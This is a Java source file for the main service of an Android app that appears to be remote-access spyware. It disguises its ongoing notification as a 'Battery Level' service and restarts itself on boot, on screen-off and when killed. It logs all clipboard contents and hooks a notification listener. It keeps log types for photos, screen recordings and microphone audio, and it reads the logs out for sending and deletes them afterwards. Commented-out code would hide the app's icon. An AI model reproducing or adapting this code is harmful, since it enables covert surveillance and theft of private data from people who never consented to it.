package com.remote.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DeviceAdminService;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;
import android.util.Log;

import com.remote.app.Managers.NotificationListener;
import com.remote.app.Managers.base;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainService extends Service {
    private static Context contextOfApplication;

    /*static String log_path;//полный путь до папки logs
    static HandlerThread waiterthread;//поток для hiddenwaiter
    static boolean syncactive = false;*/

    BroadcastReceiver mReceiver;

    public static boolean isRecording = false;//for video record

    DevicePolicyManager devicePolicyManager;
    ComponentName  deviceAdmin;

    public static SharedPreferences prefs;
    public static SharedPreferences.Editor editor;
    public static boolean admin = false;

    @Override
    public void onCreate() {
        IntentFilter filterBoot = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        filterBoot.addAction(Intent.ACTION_SCREEN_OFF);
        mReceiver = new AutoStarter();
        registerReceiver(mReceiver, filterBoot);
        super.onCreate();

        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());

    }

    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground()
    {
        toggleNotificationListenerService();
        String NOTIFICATION_CHANNEL_ID = "example.permanence";
        String channelName = "Battery Level Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Battery Level")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(1, notification);


        //clipBoard();
    }

    public static final boolean isAdmin(){ return admin;}




    @Override
    public void onStart(Intent intent, int startId) {
        devicePolicyManager = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);

        if(devicePolicyManager.isAdminActive(deviceAdmin)){
            admin=true;
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            deviceAdmin = new ComponentName(this, DeviceAdminService.class);
        }


    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);

        prefs =getSharedPreferences("settings", Context.MODE_PRIVATE);
        editor=prefs.edit();




//        PackageManager pkg=this.getPackageManager();
//        pkg.setComponentEnabledSetting(new ComponentName(this, MainActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        ClipboardManager.OnPrimaryClipChangedListener mPrimaryChangeListener = new ClipboardManager.OnPrimaryClipChangedListener() {
            public void onPrimaryClipChanged() {
                ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                if (clipboard.hasPrimaryClip()) {
                    ClipData clipData = clipboard.getPrimaryClip();
                    if (clipData.getItemCount() > 0) {
                        if (clipboard.getText().toString().isEmpty()){stopSelf();}

                        CharSequence text = clipData.getItemAt(0).getText();
                        if (text != null) {
                            try{
                                JSONObject data = new JSONObject();
                                data.put("text", text);
                                data.put(base.CLIPBOARD.DATA,new Date().getTime());
                                data.put(base.CLIPBOARD.TEXT, text);
                                WriteFile(TypeOpenFile.Clipboard,data.toString() +'\n');
                            }catch (Exception e){}
                            }
                    }
                }
            }
        };

        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(mPrimaryChangeListener);

        contextOfApplication = this;
        ConnectionManager.startAsync(this);

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        sendBroadcast(new Intent("respawnService"));
    }



    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }

    static List<String>  locallist = new ArrayList<String>();

    public static JSONObject ReadFileAndSend(Integer type){
        locallist = new ArrayList<String>();
        JSONArray array = new JSONArray();
        JSONObject object = new JSONObject();
        String log="";
        try {
            String log_path ="";//=getContextOfApplication().getFilesDir().getAbsolutePath()+"/logs";
            switch (type){
                case TypeOpenFile.Clipboard:
                    log_path=getContextOfApplication().getFilesDir().getAbsolutePath()+"/logs/clipboard";
                    log="clipboardLog";
                    break;
                case TypeOpenFile.NotificationLogger:
                    log_path=getContextOfApplication().getFilesDir().getAbsolutePath()+"/logs/nf";
                    log="nfLog";
                    break;
                case TypeOpenFile.ActionLogger:
                    log_path=getContextOfApplication().getFilesDir().getAbsolutePath()+"/logs/al";
                    log="alLog";
                    break;
                    default:
                        break;

            }
            getlocalfiles(log_path);

            File file;
            BufferedReader br;
            for (int i=0; i<locallist.size();i++){
                String file_to_open =locallist.get(i);
                file = new File(log_path + "/" +file_to_open);

                String line;
                br = new BufferedReader(new FileReader(file));
                String textLast="";
                while ((line = br.readLine()) != null) {
                    JSONObject obj = new JSONObject(line);
                    switch (type){
                        case TypeOpenFile.Clipboard:
                            if(!obj.getString("text").equals(textLast)){
                                textLast = obj.getString("text");
                                array.put(obj);
                            }
                            break;
                        default:
                            array.put(obj);
                            break;
                    }

                }
                br.close();
                file.delete();
            }
            object.put(log,array);
            return object;


        } catch (Exception e){}

        return object;
    }

    public static void getlocalfiles(String sync_path){
        try{
            String path=sync_path;
            File f = new File(path);
            File file[] = f.listFiles();
            for (int i=0; i < file.length; i++)
            {
                if(file[i].isDirectory())
                    return;
                locallist.add(file[i].getName());
            }
        }
        catch(Exception e){
        }
    }


    public static void WriteFile(Integer typeOpenFile, String text){
        try {
            FileWriter writer;
            BufferedWriter bufferWriter;
            writer = new FileWriter(OpenFile(typeOpenFile).getAbsolutePath(), true);
            bufferWriter = new BufferedWriter(writer);
            bufferWriter.write(text);
            bufferWriter.close();
        } catch (IOException e) {
            FileOutputStream fos;
            try {
                File file = new File(OpenFile(typeOpenFile).getAbsolutePath());
                fos = new FileOutputStream(file);
                fos.write(text.getBytes());
                fos.flush();
                fos.close();
            } catch (FileNotFoundException ex) {
                ex.printStackTrace();
            } catch (IOException ex) {
                ex.printStackTrace();
            }

        }
    }

    public static File OpenFile(int type){
        File dir = new File(MainService.getContextOfApplication().getApplicationInfo().dataDir+"/files/logs");
        dir.mkdirs();

        SimpleDateFormat dateFormat = new SimpleDateFormat("dd_MM_YYYY_HHmmss",
                Locale.getDefault());
        String ffile;
        switch (type){
            case TypeOpenFile.Video:
                ffile= "Video_" + dateFormat.format(new Date()) + ".mp4";
                break;
            case TypeOpenFile.Photo:
                ffile= "Photo_" + dateFormat.format(new Date()) + ".jpg";
                break;
            case TypeOpenFile.NotificationLogger:
                File fdNf = new File(MainService.getContextOfApplication().getApplicationInfo().dataDir+"/files/logs/nf");
                if (!fdNf.exists()) fdNf.mkdir();

                dateFormat = new SimpleDateFormat("dd_MM_YYYY",
                        Locale.getDefault());
                ffile= "nf/NF_" + dateFormat.format(new Date()) + ".txt";
                break;
            case TypeOpenFile.Clipboard:
                File fdCb = new File(MainService.getContextOfApplication().getApplicationInfo().dataDir+"/files/logs/clipboard");
                if (!fdCb.exists()) {
                    fdCb.mkdir();
                }
                dateFormat = new SimpleDateFormat("dd_MM_YYYY",
                        Locale.getDefault());
                ffile= "clipboard/Clipboards_" + dateFormat.format(new Date()) + ".txt";
                break;
            case TypeOpenFile.ScreenShot:
                ffile= "Screenshot_" + dateFormat.format(new Date()) + ".png";
                break;
            case TypeOpenFile.ScreenRec:
                ffile= "ScreenRec_" + dateFormat.format(new Date()) + ".mp4";
                break;
            case TypeOpenFile.ScreenRecord:
                ffile= "Screenrec_" + dateFormat.format(new Date()) + ".mp4";
                break;
            case TypeOpenFile.RecordMic:
                ffile= "Audio_" + dateFormat.format(new Date()) + ".mp3";
                break;
            case TypeOpenFile.ActionLogger:
                File fdAl = new File(MainService.getContextOfApplication().getApplicationInfo().dataDir+"/files/logs/al");
                if (!fdAl.exists()) fdAl.mkdir();
                dateFormat = new SimpleDateFormat("dd_MM_YYYY",
                        Locale.getDefault());
                ffile= "al/AL_" + dateFormat.format(new Date()) + ".txt";
                break;
            default:
                ffile = "unknown.txt";
                break;

        }

        String filename = dir.getPath() + File.separator + ffile;
        File file = new File(filename);

        return file;
    }

    private void toggleNotificationListenerService() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName(this, NotificationListener.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        pm.setComponentEnabledSetting(new ComponentName(this, NotificationListener.class),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }



}
